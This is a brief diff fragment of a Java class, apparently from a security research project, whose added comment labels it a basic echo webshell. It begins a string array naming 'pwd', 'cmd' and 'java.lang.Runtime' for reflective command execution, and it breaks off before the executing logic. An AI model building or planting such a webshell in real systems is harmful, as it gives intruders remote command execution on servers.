@@ -2,8 +2,10 @@ package org.sec.util;
 
 import java.lang.reflect.Method;
 
-public class base {
-
+/**
+ * 基础回显Webshell
+ */
+public class Base {
     public static void main(String[] args) {
         try {
             String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11","pwd","cmd","java.lang.Runtime",
